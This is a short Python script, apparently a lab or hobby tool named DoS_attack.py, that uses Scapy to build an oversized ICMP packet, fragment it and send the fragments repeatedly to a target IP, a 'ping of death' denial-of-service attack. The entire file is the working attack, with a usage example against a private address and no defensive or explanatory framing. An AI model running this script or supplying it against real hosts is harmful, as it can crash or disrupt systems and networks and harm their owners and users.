#!/usr/bin/env python3
"""

ping of death: it sends gigant fragments that exceed 64 KB after reassembly.
proving:
    sudo python3 DoS_attack.py 10.12.0.10 -c 100
"""
import argparse, random, time
from scapy.all import IP, ICMP, fragment, send, conf
conf.verb = 0

def send_pod(dst_ip, count, size, iface):
    payload = b"A" * size
    pkt = IP(dst=dst_ip)/ICMP()/payload
    frags = fragment(pkt, fragsize=1480)    
    for i in range(count):
        for f in frags:
            send(f, iface=iface, fast=True)
        if count > 1 and (i+1) % 10 == 0:
            print(f"  · {i+1} pings sent")

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('target_ip')
    p.add_argument('-c','--count', type=int, default=1,
                   help='times the gigant packet have been sent')
    p.add_argument('-s','--size', type=int, default=65535,
                   help='total weight of ICMP (bytes)')
    p.add_argument('-i','--iface', default=None)
    args = p.parse_args()
    print(f"[+] Ping of Death → {args.target_ip} ({args.count} × {args.size} B)")
    send_pod(args.target_ip, args.count, args.size, args.iface)
